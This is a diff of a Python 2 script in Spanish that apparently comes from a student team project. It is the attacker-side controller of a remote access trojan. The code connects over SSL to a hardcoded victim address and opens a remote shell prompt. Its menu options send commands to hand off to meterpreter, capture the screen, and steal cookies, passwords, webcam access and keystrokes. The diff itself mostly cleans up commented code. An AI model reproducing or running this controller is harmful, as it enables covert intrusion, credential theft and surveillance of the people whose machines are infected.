@@ -1,11 +1,20 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+'''
+	Este es el script del usuario, o atacante, como usted quiera verse.
 
+	Simplemente siga el menu, por favor no cancele el proceso con una senal, seamos civilizados :)
+'''
+
+###FYI
 victim='192.168.47.144'
 puerto=6116
 
 def info():
 	print '''
+
+	SALUDOS, este es el proyecto del tercer modulo.
+
 		Integrantes del equipo:
 			 -Fernando
 			 -Diego
@@ -35,13 +44,7 @@ def trasera(sslSock):
 	import socket  
 	import os  
 	import sys
-	#ADDRESS = (host, pto)
-
-	#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-	#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-	#ctx.use_certificate_file('cert.pem')  
-	#sslSock = SSL.Connection(ctx, sock)  
-	#sslSock.connect(ADDRESS)  
+ 
 	while True:  
 	        try:
 	            cmd = raw_input('RAT@infectado# ')
@@ -58,10 +61,7 @@ def trasera(sslSock):
 	            	print data
 	        except KeyboardInterrupt:
 	        	return
-	            #sslSock.close()
-	            #sys.exit(0)
-	#while True:  
-	#   main()
+
 
 def camara():
 	import os
@@ -100,7 +100,6 @@ def menu():
 		ctx = SSL.Context(SSL.SSLv23_METHOD)  
 		ctx.use_certificate_file('cert.pem')  
 		sslSock = SSL.Connection(ctx, sock)  
-		#sslSock.connect(ADDRESS)
 		try:
 			eleccion = int(raw_input('>>> '))
 		except:
@@ -119,15 +118,8 @@ def menu():
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
-				#salir()
-				#exit(0)
 		elif eleccion == 2:
-			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
+			try:  
 				sslSock.connect(ADDRESS)  
 				raw_input("Antes de continuar, configure meterpreter ;), puerto 4444... [ENTER]")
 				sslSock.write('2')
@@ -135,17 +127,11 @@ def menu():
 				print msg+'\n'
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 3:
-			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
+			try:  
 				sslSock.connect(ADDRESS)  
 				raw_input("Esta a punto de automatizar la captura de pantalla... [ENTER]")
 				sslSock.write('3')
@@ -153,17 +139,11 @@ def menu():
 				print msg+'\n'
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 4:
 			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
 				sslSock.connect(ADDRESS)  
 				raw_input("Esta a punto de hurtar cookies... [ENTER]")
 				sslSock.write('4')
@@ -171,17 +151,11 @@ def menu():
 				print msg+'\n'
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 5:
 			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
 				sslSock.connect(ADDRESS)  
 				raw_input("Esta a punto de hurtar passwords... [ENTER]")
 				sslSock.write('5')
@@ -189,17 +163,11 @@ def menu():
 				print msg+'\n'
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 6:
 			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
 				sslSock.connect(ADDRESS)  
 				raw_input("Esta a punto de hurtar la camara... [ENTER]")
 				sslSock.write('6')
@@ -210,17 +178,11 @@ def menu():
 				tt.start()
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 7:
-			try:
-				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
-				#ctx.use_certificate_file('cert.pem')  
-				#sslSock = SSL.Connection(ctx, sock)  
+			try: 
 				sslSock.connect(ADDRESS)  
 				raw_input("Esta a punto de hurtar el teclado... [ENTER]")
 				sslSock.write('7')
@@ -228,11 +190,9 @@ def menu():
 				print msg+'\n'
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
-				#sslSock.close()
 		elif eleccion == 8:
 			print "No implementado aun :)"
 			raw_input("Presione una tecla para continuar...")
@@ -246,6 +206,6 @@ def menu():
 			print "opcion incorrecta"
 			raw_input("Presione una tecla para continuar...")
 			os.system('clear')
-			#sslSock.close()
 
-menu()
+if __name__=='__main__':
+	menu()
